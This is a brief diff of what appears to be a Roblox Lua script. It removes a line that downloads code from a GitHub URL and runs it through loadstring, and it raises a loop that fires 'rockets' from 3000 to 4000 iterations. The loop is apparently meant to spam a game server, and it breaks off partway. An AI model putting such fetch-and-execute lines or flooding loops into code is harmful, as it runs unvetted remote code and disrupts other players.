@@ -1,6 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PhantomAngelx/PHANTOM-ANGEL/refs/heads/main/Whitelist%20people"))()
-
-local numRockets = 3000  -- Fire 3000 rockets
+local numRockets = 4000  -- Fire 4000 rockets
 
 for i = 1, numRockets do
     local args = {
